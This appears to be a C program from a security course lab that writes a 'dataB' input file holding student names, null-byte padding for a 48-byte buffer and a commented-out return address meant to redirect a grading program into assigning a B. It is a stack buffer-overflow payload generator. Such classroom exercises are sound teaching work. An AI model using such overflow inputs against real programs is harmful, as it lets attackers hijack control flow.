#include <stdio.h>

int main(void)
{
    FILE *psFile;
    int i;

    psFile = fopen("dataB", "w");

    /* 24 characters */
    fprintf(psFile, "Ben Zhou and Owen Clarke");

    /* Terminating null byte */
    putc('\0', psFile);

    /* 23 more null bytes to fill up 48 bytes of buffer */
    for (i = 0; i < 23; i++)
        putc('\0', psFile);

    /* Return address for changing grade to B */
    /* fprintf(psFile, "0x400894"); */

    fclose(psFile);

    return 0;
}